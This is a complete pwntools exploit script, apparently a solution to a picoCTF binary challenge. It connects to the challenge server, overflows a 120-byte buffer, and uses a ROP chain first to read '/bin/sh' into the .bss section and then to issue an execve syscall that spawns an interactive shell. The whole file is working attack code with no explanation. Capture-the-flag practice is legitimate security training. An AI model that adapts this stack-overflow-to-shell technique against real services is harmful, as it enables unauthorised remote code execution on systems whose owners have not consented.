#!/bin/python3

from pwn import *
import sys

elf = ELF("./vuln")

pop_rax = 0x00000000004163f4
pop_rdi = 0x0000000000400696
pop_rsi = 0x0000000000410ca3
pop_rdx = 0x000000000044cc26
bss = 0x00000000006bc3a0
syscall = 0x000000000040137c
main = 0x0000000000400c8c
read = 0x000000000044a6a0

num1 = b'84'

payload1 = b'a' * 120
payload1 += p64(pop_rax)
payload1 += p64(0)
payload1 += p64(pop_rdi)
payload1 += p64(0)
payload1 += p64(pop_rsi)
payload1 += p64(bss)
payload1 += p64(pop_rdx)
payload1 += p64(9)
payload1 += p64(read)
payload1 += p64(main)

shell_line = b'/bin/sh\x00'

num2 = b'87'

payload2 = b'a' * 120
payload2 += p64(pop_rax)
payload2 += p64(0x3b)
payload2 += p64(pop_rdi)
payload2 += p64(bss)
payload2 += p64(pop_rsi)
payload2 += p64(0)
payload2 += p64(pop_rdx)
payload2 += p64(0)
payload2 += p64(syscall)

p = remote('jupiter.challenges.picoctf.org', 28953)

p.recvuntil(b'What number would you like to guess?\n')
p.sendline(num1)
p.recvuntil(b'Name? ')
print("[*] Sending first payload")
p.sendline(payload1)
p.sendline(shell_line)
p.recvuntil(b'What number would you like to guess?\n')
p.sendline(num2)
p.recvuntil(b'Name? ')
print("[*] Sending second payload")
p.sendline(payload2)

p.interactive()